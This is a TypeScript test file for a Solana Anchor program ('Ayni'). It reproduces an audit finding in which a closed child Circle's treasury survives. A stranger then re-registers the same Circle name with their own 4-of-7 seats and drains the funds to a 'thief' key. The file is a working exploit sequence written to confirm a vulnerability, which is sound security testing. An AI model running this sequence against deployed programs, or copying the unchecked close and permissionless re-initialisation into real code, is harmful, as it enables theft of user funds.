import * as anchor from "@coral-xyz/anchor";
import { Program } from "@coral-xyz/anchor";
import { Ayni } from "../target/types/ayni";
import { assert } from "chai";

// F-1 — what happens to a child Circle's treasury when its Foundation closes it.
//
// THE QUESTION THIS ANSWERS. A Foundation can close a child Circle (4-of-7,
// propose → approve → execute). It has no authority over that child's FUNDS:
// no instruction moves one Circle's treasury to another, and no ProposalAction
// variant can express it. So what happens to money sitting in the child's
// treasury when the Circle account is closed?
//
// The treasury is a SEPARATE PDA — ["treasury", circle] — so closing the Circle
// does not close it, and the lamports survive. But every spend path
// (withdraw_treasury, withdraw_treasury_token, refill_faucet) takes
// `circle: Account<'info, Circle>`, which cannot deserialise once the account
// is gone. execute_child_close does not check that the treasury is empty.
//
// And a Circle is a PDA seeded ["circle", parent, name], while
// initialize_circle is permissionless with CALLER-CHOSEN seats. So the funds
// are not burned — they are claimable by whoever re-registers the same name
// under the same parent and seats themselves 4-of-7.
//
// This file establishes which of those is true by doing it, rather than by
// reading the code and reasoning. Run:
//   npx ts-mocha -p ./tsconfig.json -t 1000000 tests/treasury-orphan.ts
describe("F-1 — a closed Circle's treasury", () => {
  const provider = anchor.AnchorProvider.env();
  anchor.setProvider(provider);
  const program = anchor.workspace.Ayni as Program<Ayni>;
  const payer = provider.wallet as anchor.Wallet;

  const root = anchor.web3.Keypair.generate().publicKey;
  const fSeats = Array.from({ length: 7 }, () => anchor.web3.Keypair.generate());
  // The seats a stranger would install on the re-created Circle. Entirely
  // unrelated to the original Circle's Council — that is the point.
  const xSeats = Array.from({ length: 7 }, () => anchor.web3.Keypair.generate());

  const CHILD_NAME = "funded-child";

  const circlePda = (parent: anchor.web3.PublicKey, name: string) =>
    anchor.web3.PublicKey.findProgramAddressSync(
      [Buffer.from("circle"), parent.toBuffer(), Buffer.from(name)],
      program.programId
    )[0];

  const treasuryPda = (circle: anchor.web3.PublicKey) =>
    anchor.web3.PublicKey.findProgramAddressSync(
      [Buffer.from("treasury"), circle.toBuffer()],
      program.programId
    )[0];

  const closeVotePda = (child: anchor.web3.PublicKey, nonce: number) =>
    anchor.web3.PublicKey.findProgramAddressSync(
      [Buffer.from("childclose"), child.toBuffer(), new anchor.BN(nonce).toArrayLike(Buffer, "le", 8)],
      program.programId
    )[0];

  const proposalPda = (circle: anchor.web3.PublicKey, nonce: number) =>
    anchor.web3.PublicKey.findProgramAddressSync(
      [Buffer.from("proposal"), circle.toBuffer(), new anchor.BN(nonce).toArrayLike(Buffer, "le", 8)],
      program.programId
    )[0];

  const F = circlePda(root, "found-F1");
  const C = circlePda(F, CHILD_NAME);
  const CT = treasuryPda(C);

  const DONATION = 0.5 * anchor.web3.LAMPORTS_PER_SOL;
  const DAY = 24 * 60 * 60;

  const fund = async (kps: anchor.web3.Keypair[]) => {
    for (const k of kps) {
      const sig = await provider.connection.requestAirdrop(k.publicKey, 2 * anchor.web3.LAMPORTS_PER_SOL);
      await provider.connection.confirmTransaction(sig);
    }
  };

  before(async () => {
    await fund([...fSeats.slice(0, 4), ...xSeats.slice(0, 4)]);

    // Foundation, and a genuine child of it. recovery_timelock 0 so nothing in
    // this test waits on a contest window — the window is not what is under
    // test here.
    await program.methods
      .initializeCircle(root, "found-F1", new anchor.BN(365 * DAY), new anchor.BN(0), fSeats.map((k) => k.publicKey) as any)
      .accounts({ circle: F, parent: root, payer: payer.publicKey })
      .rpc();

    await program.methods
      .initializeCircle(F, CHILD_NAME, new anchor.BN(365 * DAY), new anchor.BN(0), fSeats.map((k) => k.publicKey) as any)
      .accounts({ circle: C, parent: F, payer: payer.publicKey })
      .rpc();
  });

  it("takes a donation the way any Circle does", async () => {
    await program.methods
      .donate(new anchor.BN(DONATION))
      .accounts({ circle: C, treasury: CT, donor: payer.publicKey })
      .rpc();
    const bal = await provider.connection.getBalance(CT);
    assert.isAtLeast(bal, DONATION, "the donation did not reach the treasury");
  });

  it("is closed by its Foundation, 4-of-7, with the treasury still funded", async () => {
    const nonce = 1;
    const vote = closeVotePda(C, nonce);
    const before = await provider.connection.getBalance(CT);
    assert.isAtLeast(before, DONATION, "precondition: the treasury must hold funds at close time");

    await program.methods
      .proposeChildClose(new anchor.BN(nonce), new anchor.BN(2 * DAY))
      .accounts({ foundation: F, child: C, vote, proposer: fSeats[0].publicKey })
      .signers([fSeats[0]])
      .rpc();

    for (const s of fSeats.slice(1, 4)) {
      await program.methods
        .approveChildClose()
        .accounts({ foundation: F, vote, seat: s.publicKey })
        .signers([s])
        .rpc();
    }

    await program.methods
      .executeChildClose()
      .accounts({ foundation: F, vote, child: C, profile: null, recipient: payer.publicKey, executor: payer.publicKey })
      .rpc();

    const closed = await provider.connection.getAccountInfo(C);
    assert.isNull(closed, "the child Circle account was not closed");
  });

  it("STILL HOLDS THE MONEY — closing the Circle does not close the treasury", async () => {
    const bal = await provider.connection.getBalance(CT);
    assert.isAtLeast(
      bal,
      DONATION,
      "the treasury lost its funds on close (if this fails, the finding in docs/testing-foundation.md is wrong)"
    );
  });

  it("and the money is unreachable: no spend path can name a Circle that is gone", async () => {
    // There is no proposal to draw against, and there cannot be one: `propose`
    // needs the Circle account too. This asserts the weaker, sufficient thing —
    // withdraw_treasury cannot even be constructed against a closed Circle.
    let threw = false;
    try {
      await program.methods
        .withdrawTreasury()
        .accounts({
          circle: C,
          proposal: proposalPda(C, 1),
          treasury: CT,
          recipient: payer.publicKey,
          caller: payer.publicKey,
          allow: null,
        })
        .rpc();
    } catch {
      threw = true;
    }
    assert.isTrue(threw, "a withdrawal succeeded against a closed Circle");
  });

  it("but a stranger can re-register the same name and seat themselves 4-of-7", async () => {
    // The Circle address is a PDA of (parent, name), and initialize_circle is
    // permissionless with caller-chosen seats. So the address comes back, under
    // a Council that has nothing to do with the original one.
    await program.methods
      .initializeCircle(F, CHILD_NAME, new anchor.BN(365 * DAY), new anchor.BN(0), xSeats.map((k) => k.publicKey) as any)
      .accounts({ circle: C, parent: F, payer: xSeats[0].publicKey })
      .signers([xSeats[0]])
      .rpc();

    const revived = await program.account.circle.fetch(C);
    assert.equal(
      revived.council.seats[0].toBase58(),
      xSeats[0].publicKey.toBase58(),
      "the re-created Circle did not take the stranger's seats"
    );
    // Same address, same treasury PDA, funds intact — now under new management.
    const bal = await provider.connection.getBalance(CT);
    assert.isAtLeast(bal, DONATION, "the treasury did not survive to the re-created Circle");
  });

  it("and drains the orphaned treasury with its own 4-of-7", async () => {
    const nonce = 42;
    const prop = proposalPda(C, nonce);
    const thief = anchor.web3.Keypair.generate().publicKey;
    const amount = new anchor.BN(DONATION);

    await program.methods
      .propose(new anchor.BN(nonce), { withdrawTreasury: { amount, recipient: thief } } as any)
      .accounts({ circle: C, proposal: prop, proposer: xSeats[0].publicKey })
      .signers([xSeats[0]])
      .rpc();

    for (const s of xSeats.slice(1, 4)) {
      await program.methods
        .approve()
        .accounts({ circle: C, proposal: prop, seat: s.publicKey })
        .signers([s])
        .rpc();
    }

    await program.methods
      .executeProposal()
      .accounts({ circle: C, proposal: prop, executor: xSeats[0].publicKey })
      .signers([xSeats[0]])
      .rpc();

    await program.methods
      .withdrawTreasury()
      .accounts({
        circle: C,
        proposal: prop,
        treasury: CT,
        recipient: thief,
        caller: xSeats[0].publicKey,
        allow: null,
      })
      .signers([xSeats[0]])
      .rpc();

    const got = await provider.connection.getBalance(thief);
    assert.isAtLeast(got, DONATION, "the orphaned treasury was NOT claimable — the finding is overstated");
  });
});
